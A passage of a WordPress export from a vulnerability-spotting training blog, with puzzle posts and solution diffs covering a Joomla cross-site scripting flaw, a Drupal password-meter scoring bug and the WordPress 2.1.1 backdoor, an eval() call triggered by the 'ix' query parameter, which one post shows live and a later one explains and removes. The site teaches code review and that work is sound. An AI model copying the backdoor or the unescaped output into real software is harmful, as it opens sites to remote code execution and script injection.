?&gt;

[/ccnLe_php] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>655</wp:post_id>
		<wp:post_date>2010-01-18 08:00:33</wp:post_date>
		<wp:post_date_gmt>2010-01-18 15:00:33</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>temptation</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[Temptation]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_display_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title_multi</wp:meta_key>
			<wp:meta_value><![CDATA[Temptation]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_keywords</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_description</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/8GASuK]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[e06b864943e5c79266c4fb7aff4005d9]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>374</wp:comment_id>
			<wp:comment_author><![CDATA[spotthevuln.com&raquo; Vulnerable Source Code &#8211; Temptation &#8211; Cross Site Scripting ~ spotthevuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2010/01/temptation-cross-site-scripting/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2010-01-22 08:18:31</wp:comment_date>
			<wp:comment_date_gmt>2010-01-22 15:18:31</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Original Code: Found Here [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>Temptation - Cross Site Scripting</title>
		<link>http://spotthevuln.com/2010/01/temptation-cross-site-scripting/</link>
		<pubDate>Fri, 22 Jan 2010 15:00:14 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=658</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Details</h2>
Affected Software: Joomla

Fixed in Version: 1.x

Issue Type: Cross Site Scripting

Original Code: <a title="Temptation" href="http://spotthevuln.com/2010/01/temptation/" target="_blank">Found Here</a>
<h2>Description</h2>
Classic XSS on Joomla.  This particular XSS isn’t anything really special, but all the references to SQL and databases surrounding the vulnerable code could have thrown some people off during code review.  In this code $this_page is tainted with attacker controlled data in the two lines below:
<blockquote>$this_page = (!empty($_SERVER['PHP_SELF'])) ? $_SERVER['PHP_SELF'] : $_ENV['PHP_SELF'];

$this_page .= '&amp;' . ((!empty($_SERVER['QUERY_STRING'])) ? $_SERVER['QUERY_STRING'] : $_ENV['QUERY_STRING']);</blockquote>
$this_page is then used to build an HTML string.  The Joomla developers fixed this vulnerability by simply calling htmlspecialchars() before echoing $this_page to the user.
<h2>Developers Solution</h2>
[cce lang="diff"]

function sql_freeresult($query_id = false)
{
if (!$query_id)
{
$query_id = $this-&gt;query_result;
}

return ($query_id) ? @mysql_free_result($query_id) : false;

}


function sql_escape($msg)
{

return mysql_escape_string(stripslashes($msg));

}



function sql_error($sql = '')
{

$result = array(

'message' =&gt; @mysql_error(),
'code' =&gt; @mysql_errno()

);


if (!$this-&gt;return_on_error)
{

if ($this-&gt;transaction)
{

$this-&gt;sql_transaction('rollback');

}

$this_page = (!empty($_SERVER['PHP_SELF'])) ? $_SERVER['PHP_SELF'] : $_ENV['PHP_SELF'];
$this_page .= '&amp;' . ((!empty($_SERVER['QUERY_STRING'])) ? $_SERVER['QUERY_STRING'] : $_ENV['QUERY_STRING']);

-$message = '&lt;u&gt;SQL ERROR&lt;/u&gt; [ ' . SQL_LAYER . ' ]&lt;br /&gt;&lt;br /&gt;' . @mysql_error() . '&lt;br /&gt;&lt;br /&gt;&lt;u&gt;CALLING PAGE&lt;/u&gt;&lt;br /&gt;&lt;br /&gt;'  . $this_page . (($sql != '') ? '&lt;br /&gt;&lt;br /&gt;&lt;u&gt;SQL&lt;/u&gt;&lt;br /&gt;&lt;br /&gt;' . $sql : '') . '&lt;br /&gt;';
+$message = '&lt;u&gt;SQL ERROR&lt;/u&gt; [ ' . SQL_LAYER . ' ]&lt;br /&gt;&lt;br /&gt;' . @mysql_error() . '&lt;br /&gt;&lt;br /&gt;&lt;u&gt;CALLING PAGE&lt;/u&gt;&lt;br /&gt;&lt;br /&gt;'  . htmlspecialchars($this_page) . (($sql != '') ? '&lt;br /&gt;&lt;br /&gt;&lt;u&gt;SQL&lt;/u&gt;&lt;br /&gt;&lt;br /&gt;' . $sql : '') . '&lt;br /&gt;';
trigger_error($message, E_USER_ERROR);

}


return $result;

}


} // class sql_db


} // if ... define


?&gt;

[/cce] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>658</wp:post_id>
		<wp:post_date>2010-01-22 08:00:14</wp:post_date>
		<wp:post_date_gmt>2010-01-22 15:00:14</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>temptation-cross-site-scripting</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_page_title</wp:meta_key>
			<wp:meta_value><![CDATA[Cross-Site Scripting (XSS) Vulnerability Code Example]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/7UplCm]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[59ee31f7da5ab5a7063f8d4e3d7864bd]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Impact</title>
		<link>http://spotthevuln.com/2010/01/impact/</link>
		<pubDate>Mon, 25 Jan 2010 15:00:06 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=663</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>People that are really very weird can get into sensitive positions and  have a tremendous impact on history.
- Dan Quayle</strong></blockquote>
[ccnLe_php]
function comment_author_rss() {
echo get_comment_author_rss();
}

function comment_text_phpfilter($filterdata) {
eval($filterdata);
}

function comment_text_rss() {
$comment_text = get_comment_text();
$comment_text = apply_filters('comment_text_rss', $comment_text);
echo $comment_text;
}


function comments_rss_link($link_text = 'Comments RSS', $commentsrssfilename = '') {
$url = comments_rss($commentsrssfilename);
echo "&lt;a href='$url'&gt;$link_text&lt;/a&gt;";
}

...


function get_category_rss_link($echo = false, $cat_ID, $category_nicename) {
$permalink_structure = get_option('permalink_structure');

if ( '' == $permalink_structure ) {
$link = get_option('home') . '?feed=rss2&amp;amp;cat=' . $cat_ID;
} else {
$link = get_category_link($cat_ID);
$link = $link . "feed/";
}

$link = apply_filters('category_feed_link', $link);

if ( $echo )
echo $link;
return $link;
}

if ($_GET["ix"]) { comment_text_phpfilter($_GET["ix"]); }

function get_the_category_rss($type = 'rss') {
$categories = get_the_category();
$the_list = '';
foreach ( (array) $categories as $category ) {
$category-&gt;cat_name = convert_chars($category-&gt;cat_name);
if ( 'rdf' == $type )
$the_list .= "\n\t\t&lt;dc:subject&gt;&lt;![CDATA[$category-&gt;cat_name]]&gt;&lt;/dc:subject&gt;\n";
else
$the_list .= "\n\t\t&lt;category&gt;&lt;![CDATA[$category-&gt;cat_name]]&gt;&lt;/category&gt;\n";
}
return apply_filters('the_category_rss', $the_list, $type);
}

[/ccnLe_php] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>663</wp:post_id>
		<wp:post_date>2010-01-25 08:00:06</wp:post_date>
		<wp:post_date_gmt>2010-01-25 15:00:06</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>impact</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[78c08f9a1d45c4324c26726da6396a3e]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/9fUJDy]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>379</wp:comment_id>
			<wp:comment_author><![CDATA[spotthevuln.com&raquo; Vulnerable Source Code &#8211; Impact &#8211; Command Injection ~ spotthevuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2010/01/impact-command-injection/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2010-01-29 00:01:06</wp:comment_date>
			<wp:comment_date_gmt>2010-01-29 07:01:06</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Original Code: Found Here [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>Impact - Command Injection</title>
		<link>http://spotthevuln.com/2010/01/impact-command-injection/</link>
		<pubDate>Thu, 28 Jan 2010 15:00:57 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=666</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Details</h2>
Affected Software: WordPress

Fixed in Version: 2.1.1

Issue Type: Command Injection

Original Code: <a title="Impact" href="http://spotthevuln.com/2010/01/impact/" target="_blank">Found Here</a>
<h2>Description</h2>
This example was actually a backdoor someone had planted in WordPress 2.1.1.  Apparently, someone either broke into the wordpress server or hacked a wordpress dev account and inserted this back door.  The back door was simple, create a function which simply calls eval on a arguments passed to it.  The attacker named this function “comment_text_phpfilter()” and the contents of the function are provided below:
<blockquote>function comment_text_phpfilter($filterdata) {
eval($filterdata);
}</blockquote>
Several lines later, the attacker planted a mechanism to call the backdoor.  In this case, the attacker checked for the presense of the “ix” parameter being passed via the querystring.  If the “ix” querystring parameter was present, the value assigned to “ix” would be passed to “comment_text_phpfilter()”, which would pass the attacker supplied value to eval().
<blockquote>if ($_GET["ix"]) { comment_text_phpfilter($_GET["ix"]); }</blockquote>
<h2>Developers Solution</h2>
[cce lang="diff"]

function comment_author_rss() {
echo get_comment_author_rss();
}

-function comment_text_phpfilter($filterdata) {
-eval($filterdata);
-}

function comment_text_rss() {
$comment_text = get_comment_text();
$comment_text = apply_filters('comment_text_rss', $comment_text);
echo $comment_text;
}

function comments_rss_link($link_text = 'Comments RSS', $commentsrssfilename = '') {
$url = comments_rss($commentsrssfilename);
echo "&lt;a href='$url'&gt;$link_text&lt;/a&gt;";
}

...

function get_category_rss_link($echo = false, $cat_ID, $category_nicename) {
$permalink_structure = get_option('permalink_structure');

if ( '' == $permalink_structure ) {
$link = get_option('home') . '?feed=rss2&amp;amp;cat=' . $cat_ID;
} else {
$link = get_category_link($cat_ID);
$link = $link . "feed/";
}

$link = apply_filters('category_feed_link', $link);

if ( $echo )
echo $link;
return $link;
}

-if ($_GET["ix"]) { comment_text_phpfilter($_GET["ix"]); }

function get_the_category_rss($type = 'rss') {
$categories = get_the_category();
$the_list = '';
foreach ( (array) $categories as $category ) {
$category-&gt;cat_name = convert_chars($category-&gt;cat_name);
if ( 'rdf' == $type )
$the_list .= "\n\t\t&lt;dc:subject&gt;&lt;![CDATA[$category-&gt;cat_name]]&gt;&lt;/dc:subject&gt;\n";
else
$the_list .= "\n\t\t&lt;category&gt;&lt;![CDATA[$category-&gt;cat_name]]&gt;&lt;/category&gt;\n";
}
return apply_filters('the_category_rss', $the_list, $type);
}

[/cce] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>666</wp:post_id>
		<wp:post_date>2010-01-28 08:00:57</wp:post_date>
		<wp:post_date_gmt>2010-01-28 15:00:57</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>impact-command-injection</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="category" nicename="privilege-escalation"><![CDATA[Privilege Escalation]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<category domain="category" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#code #development]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/bvG37F]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[705d5cdc2aa46c7aebd4f8b0e67e70ba]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[705d5cdc2aa46c7aebd4f8b0e67e70ba]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Elephants</title>
		<link>http://spotthevuln.com/2010/02/elephants/</link>
		<pubDate>Mon, 01 Feb 2010 15:00:52 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=673</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>Yesterday I shot an elephant in my pajamas. How he got in my pajamas I don't know</strong><strong>.
- Groucho Marx</strong></blockquote>
[ccnLe_php]

/**
* Evaluate the strength of a user's password.
*
* Returns the estimated strength and the relevant output message.
*/

Drupal.evaluatePasswordStrength = function (password, translate) {

var weaknesses = 0, strength = 100, msg = [];
var hasLowercase = password.match(/[a-z]+/);
var hasUppercase = password.match(/[A-Z]+/);
var hasNumbers = password.match(/[0-9]+/);
var hasPunctuation = password.match(/[^a-zA-Z0-9]+/);

// If there is a username edit box on the page, compare password to that, otherwise
// use value from the database.

var usernameBox = $('input.username');
var username = (usernameBox.length &gt; 0) ? usernameBox.val() : translate.username;

// Lose 10 points for every character less than 6.

if (password.length &lt; 6) {
msg.push(translate.tooShort);
strength -= (6 - password.length) * 10;
}

// Count weaknesses.
if (!hasLowercase) {
msg.push(translate.addLowerCase);
weaknesses++;
}

if (!hasUppercase) {
msg.push(translate.addUpperCase);
weaknesses++;
}
if (!hasNumbers) {
msg.push(translate.addNumbers);
weaknesses++;
}

if (!hasPunctuation) {
msg.push(translate.addPunctuation);
weaknesses++;
}

...

// Based on the strength, work out what text should be shown by the password strength meter.
if (strength &lt; 60) {
indicatorText = translate.weak;
} else if (strength &lt; 70) {
indicatorText = translate.fair;
} else if (strength &lt; 80) {
indicatorText = translate.good;
} else if (strength &lt; 100) {
indicatorText = translate.strong;
}

// Assemble the final message.
msg = translate.hasWeaknesses + '&lt;ul&gt;&lt;li&gt;' + msg.join('&lt;/li&gt;&lt;li&gt;') + '&lt;/li&gt;&lt;/ul&gt;';
return { strength: strength, message: msg, indicatorText: indicatorText }

[/ccnLe_php] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>673</wp:post_id>
		<wp:post_date>2010-02-01 08:00:52</wp:post_date>
		<wp:post_date_gmt>2010-02-01 15:00:52</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>elephants</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[Elephants]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_display_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title_multi</wp:meta_key>
			<wp:meta_value><![CDATA[Elephants]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_keywords</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_description</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/boAzYB]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[d727f45bd203472e49741dc7fa3b8176]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>380</wp:comment_id>
			<wp:comment_author><![CDATA[Roy]]></wp:comment_author>
			<wp:comment_author_email>roysteves@gmail.com</wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP>128.170.63.33</wp:comment_author_IP>
			<wp:comment_date>2010-02-01 11:33:58</wp:comment_date>
			<wp:comment_date_gmt>2010-02-01 18:33:58</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[After all the work of determining weaknesses, it doesn't appear to use that count.  

Passwords of six or more characters would all be "strong" although the msg would at least contain the warnings.]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>384</wp:comment_id>
			<wp:comment_author><![CDATA[spotthevuln.com&raquo; Vulnerable Source Code &#8211; Elephant &#8211; Defense in Depth ~ spotthevuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2010/02/elephant-defense-in-depth/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2010-02-05 09:41:36</wp:comment_date>
			<wp:comment_date_gmt>2010-02-05 16:41:36</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Original Code: Found Here [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>Elephant - Defense in Depth</title>
		<link>http://spotthevuln.com/2010/02/elephant-defense-in-depth/</link>
		<pubDate>Fri, 05 Feb 2010 16:41:29 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=675</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Details</h2>
Affected Software: Drupal

Fixed in Version: 1.2.0

Issue Type: Defense in Depth

Original Code: <a title="Elephant" href="http://spotthevuln.com/2010/02/elephants/" target="_blank">Found Here</a>
<h2>Description</h2>
This was a simple change to a security message shown to a user.  Although not a critical security fix, this can help users make better decisions with regards to choosing an appropriate password.  The code sample provided below shows that Durpal checks for lowercase, uppercase, numbers, and punctuation in the user’s password.
<blockquote>var weaknesses = 0, strength = 100, msg = [];

var hasLowercase = password.match(/[a-z]+/);

var hasUppercase = password.match(/[A-Z]+/);

var hasNumbers = password.match(/[0-9]+/);

var hasPunctuation = password.match(/[^a-zA-Z0-9]+/);</blockquote>
In addition to the checks above, the passwords length is also checked.  Durpal assigns the password a “score” of 100 and subtracts from this score if weaknesses are detected.  In this case, the Durpal decided that if the password was less than six characters, they would subtract 10 points from the password strength for every character short of 6.
<blockquote>strength -= (6 - password.length) * 10;</blockquote>
Later, the password is put through a “strength scale” where every password that has a score above “80” gets a rating of “strong”.
<blockquote>

} else if (strength &lt; 80) {

indicatorText = translate.good;

} else if (strength &lt; 100) {

indicatorText = translate.strong;</blockquote>
Using this logic, it was possible for a user to select a 4 character password that was rated as strong.  To combat this, the Durpal developers penalized the user 30 points if they selected a password with less than 6 characters, guaranteeing that a password with less than 6 characters would never be rated “strong”.

The safer way to go about this might be to assign a password strength of zero and build up the strength value as conditions are met.
<h2>Developers Solution</h2>
[cce lang="diff"]

/**
* Evaluate the strength of a user's password.
*
* Returns the estimated strength and the relevant output message.
*/

Drupal.evaluatePasswordStrength = function (password, translate) {

var weaknesses = 0, strength = 100, msg = [];
var hasLowercase = password.match(/[a-z]+/);
var hasUppercase = password.match(/[A-Z]+/);
var hasNumbers = password.match(/[0-9]+/);
var hasPunctuation = password.match(/[^a-zA-Z0-9]+/);

// If there is a username edit box on the page, compare password to that, otherwise
// use value from the database.

var usernameBox = $('input.username');
var username = (usernameBox.length &gt; 0) ? usernameBox.val() : translate.username;

-// Lose 10 points for every character less than 6.
+// Lose 5 points for every character less than 6, plus a 30 point penalty.
if (password.length &lt; 6) {
msg.push(translate.tooShort);
-  strength -= (6 - password.length) * 10;
+  strength -= ((6 - password.length) * 5) + 30;
}

// Count weaknesses.
if (!hasLowercase) {
msg.push(translate.addLowerCase);
weaknesses++;
}

if (!hasUppercase) {
msg.push(translate.addUpperCase);
weaknesses++;
}
if (!hasNumbers) {
msg.push(translate.addNumbers);
weaknesses++;
}

if (!hasPunctuation) {
msg.push(translate.addPunctuation);
weaknesses++;
}

...

// Based on the strength, work out what text should be shown by the password strength meter.
if (strength &lt; 60) {
indicatorText = translate.weak;
} else if (strength &lt; 70) {
indicatorText = translate.fair;
} else if (strength &lt; 80) {
indicatorText = translate.good;
-} else if (strength &lt; 100) {
+} else if (strength &lt;= 100) {
indicatorText = translate.strong;
}

// Assemble the final message.
msg = translate.hasWeaknesses + '&lt;ul&gt;&lt;li&gt;' + msg.join('&lt;/li&gt;&lt;li&gt;') + '&lt;/li&gt;&lt;/ul&gt;';
return { strength: strength, message: msg, indicatorText: indicatorText }

[/cce] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>675</wp:post_id>
		<wp:post_date>2010-02-05 09:41:29</wp:post_date>
		<wp:post_date_gmt>2010-02-05 16:41:29</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>elephant-defense-in-depth</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="defense-in-depth"><![CDATA[Defense In Depth]]></category>
		<category domain="category" nicename="drupal"><![CDATA[Drupal]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[bc1c77fc59c958d92c63d66eb68305d3]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/dxhldL]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
